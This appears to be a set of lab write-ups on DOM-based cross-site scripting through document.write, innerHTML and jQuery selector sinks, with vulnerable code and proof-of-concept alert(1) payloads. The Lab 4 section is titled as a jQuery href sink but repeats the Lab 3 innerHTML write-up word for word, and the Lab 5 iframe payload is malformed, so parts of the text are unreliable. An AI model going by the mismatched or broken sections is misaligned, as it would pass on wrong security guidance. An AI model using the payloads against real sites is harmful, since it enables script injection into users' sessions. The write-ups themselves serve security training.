# LAB:1 DOM XSS in document.write sink using source location.search
---
## **Overview**
In this lab, we successfully exploited a **DOM-based Cross-Site Scripting (XSS) vulnerability** in a web application. The vulnerability stemmed from the improper handling of user-controlled input via the `document.write()` function.

## **Vulnerability Analysis**
The application contained the following JavaScript snippet:

```javascript
<script>
    function trackSearch(query) {
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
        trackSearch(query);
    }
</script>
```

### **Key Observations:**
- The script **retrieves the `search` parameter** from the URL using `URLSearchParams`.
- The `search` value is **passed directly** to `document.write()` without sanitization.
- This allows an attacker to **inject arbitrary HTML or JavaScript**, leading to XSS.

## **Exploitation Steps**

1. **Identifying the Source and Sink:**
   - **Source:** `window.location.search` → Retrieves user input from the URL.
   - **Sink:** `document.write()` → Directly writes user input into the DOM.

2. **Crafting the Payload:**
   - To break out of the `<img>` tag and execute JavaScript, we used:
     ```
     "><script>alert(1)</script>
     ```
   - This payload closes the `<img>` tag early and injects a `<script>` element.

3. **Executing the Attack:**
   - We injected our payload into the URL:
     ```
     https://victim.com/?search="><script>alert(1)</script>
     ```
   - The browser interpreted the injected `<script>` and executed `alert(1)`.
   - The successful alert box confirmed **DOM-based XSS**.
---
# LAB:2 DOM XSS in document.write sink using source location.search inside a select element
---
### **Write-Up: DOM-Based XSS in Stock Checker Functionality**  

#### **Introduction**
This lab presents a **DOM-based Cross-Site Scripting (XSS)** vulnerability in the stock checker functionality. The issue arises due to the use of `document.write()` in JavaScript, which directly writes user-controlled data (from `location.search`) into the HTML page without proper sanitization.  

#### **Understanding the Vulnerability**
- The JavaScript code retrieves the `storeId` parameter from the URL and writes it inside an HTML `<select>` dropdown.
- The critical vulnerability lies in the following snippet:  
  ```js
  if(store) {
      document.write('<option selected>'+store+'</option>');
  }
  ```
  - Here, `store` is **user-controlled** and gets injected into the page **without any sanitization**.
  - If an attacker provides a malicious `storeId` value, it can **break out of the `<option>` tag** and inject JavaScript code.

#### **Crafting the Exploit**
To exploit this vulnerability, we need to **escape the `<option>` context** and inject our `<script>` payload.  
- The HTML structure being generated:
  ```html
  <option selected>USER-CONTROLLED-INPUT</option>
  ```
- A simple payload:
  ```
  "><script>alert(1)</script>
  ```
  - **`">`** closes the current `<option>` tag.
  - **`<script>alert(1)</script>`** injects a script that executes `alert(1)`, proving successful exploitation.

#### **Proof of Concept (PoC) Payload**
We append the malicious payload to the URL as follows:  
```
GET /product?productId=1&storeId="><script>alert(1)</script>
```
- This manipulates the resulting HTML:
  ```html
  <option selected=""></option><script>alert(1)</script>
  ```
  - This ensures our script executes immediately.

#### **Execution Steps**
1. **Visit the vulnerable website.**
2. **Modify the URL:**  
   ```
   https://vulnerable-website.com/product?productId=1&storeId="><script>alert(1)</script>
   ```
3. **Press Enter.**
4. **Observe an alert box popping up, confirming XSS execution.**

---
# LAB:3 DOM XSS in innerHTML sink using source location.search
---
# Exploiting DOM-Based XSS via `innerHTML` Sink

## ** Overview**
In this lab, we successfully exploited a **DOM-based Cross-Site Scripting (XSS) vulnerability** caused by the unsafe use of `innerHTML`. The vulnerability allowed us to inject and execute arbitrary JavaScript through user-controlled input.

## ** Vulnerability Analysis**
The application contained the following JavaScript snippet:

```javascript
<script>
    function doSearchQuery(query) {
        document.getElementById('searchMessage').innerHTML = query;
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
        doSearchQuery(query);
    }
</script>
```

### ** Key Observations:**
- The script **retrieves the `search` parameter** from the URL using `URLSearchParams.get('search')`.
- It **inserts user input directly into the page** via `innerHTML`, without sanitization.
- Modern browsers prevent `<script>` tags from executing when inserted via `innerHTML`, but alternative techniques still allow execution.

## ** Exploitation Steps**

1. **Identifying the Source and Sink:**
   - **Source:** `window.location.search` → Retrieves user input from the URL.
   - **Sink:** `innerHTML` → Directly inserts unescaped input into the DOM.

2. **Crafting the Payload:**
   - Since `<script>` tags don’t execute inside `innerHTML`, we used an **`<img>` element with an `onerror` event** to trigger JavaScript execution.
   - Payload:
     ```html
     <img src=x onerror=alert(1)>
     ```

3. **Executing the Attack:**
   - We injected our payload into the URL:
     ```
     https://victim.com/?search=<img src=x onerror=alert(1)>
     ```
   - The browser interpreted the injected HTML:
     ```html
     <img src=x onerror=alert(1)>
     ```
   - Since `x` is not a valid image, the `onerror` event fired, executing `alert(1)`.
   - The successful alert box confirmed **DOM-based XSS**.

---
# Lab: 4 DOM XSS in jQuery anchor href attribute sink using location.search source
---
# Exploiting DOM-Based XSS via `innerHTML` Sink

## **Overview**
In this lab, we successfully exploited a **DOM-based Cross-Site Scripting (XSS) vulnerability** caused by the unsafe use of `innerHTML`. The vulnerability allowed us to inject and execute arbitrary JavaScript through user-controlled input.

## **Vulnerability Analysis**
The application contained the following JavaScript snippet:

```javascript
<script>
    function doSearchQuery(query) {
        document.getElementById('searchMessage').innerHTML = query;
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
        doSearchQuery(query);
    }
</script>
```

### **Key Observations:**
- The script **retrieves the `search` parameter** from the URL using `URLSearchParams.get('search')`.
- It **inserts user input directly into the page** via `innerHTML`, without sanitization.
- Modern browsers prevent `<script>` tags from executing when inserted via `innerHTML`, but alternative techniques still allow execution.

## **Exploitation Steps**

1. **Identifying the Source and Sink:**
   - **Source:** `window.location.search` → Retrieves user input from the URL.
   - **Sink:** `innerHTML` → Directly inserts unescaped input into the DOM.

2. **Crafting the Payload:**
   - Since `<script>` tags don’t execute inside `innerHTML`, we used an **`<img>` element with an `onerror` event** to trigger JavaScript execution.
   - Payload:
     ```html
     <img src=x onerror=alert(1)>
     ```

3. **Executing the Attack:**
   - We injected our payload into the URL:
     ```
     https://victim.com/?search=<img src=x onerror=alert(1)>
     ```
   - The browser interpreted the injected HTML:
     ```html
     <img src=x onerror=alert(1)>
     ```
   - Since `x` is not a valid image, the `onerror` event fired, executing `alert(1)`.
   - The successful alert box confirmed **DOM-based XSS**.

---
# Lab 5: DOM XSS in jQuery selector sink using a hashchange event
---
# Exploiting DOM-Based XSS via jQuery Selector Injection

## **Overview**
This lab demonstrated a **DOM-based Cross-Site Scripting (XSS) vulnerability** caused by the unsafe usage of `window.location.hash` inside a jQuery selector. We successfully exploited this vulnerability using an `<iframe>` injection technique to execute arbitrary JavaScript.

## **Vulnerability Analysis**
The vulnerable JavaScript code on the home page:
```javascript
$(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
});
```
### **Key Observations:**
- The script listens for **hash changes** and extracts `window.location.hash` (which is **user-controlled**).
- The extracted input is **directly inserted into the jQuery `:contains()` selector**, making it **vulnerable to injection**.
- Attackers can **inject HTML elements and JavaScript** via the hash fragment (`#`), leading to **DOM-based XSS**.

## **Exploitation Steps**

1. **Identify the vulnerability:**
   - Use Burp Suite or browser **DevTools** to analyze the JavaScript handling `location.hash`.
   - Confirm that user input is **directly injected** into `:contains()`, making it vulnerable to XSS.

2. **Crafting the Payload:**
   - We use an **`<iframe>` injection** to deliver the exploit:
     ```html
     <iframe src="https://YOUR-LAB-ID.web-security-academy.net/#"><img src=x onerror=alert(1)"></iframe>
     ```
   - This injects the XSS payload inside the `hash` and **triggers execution** when the event handler processes it.

3. **Deploying the Exploit:**
   - **Open the exploit server** from the lab banner.
   - In the **Body** section, insert the **malicious `<iframe>` payload**.
   - Click **Store** to save the exploit.
   - Click **View Exploit** to verify execution (confirming `alert(1)`).
   - Click **Deliver to Victim** to complete the lab.
---
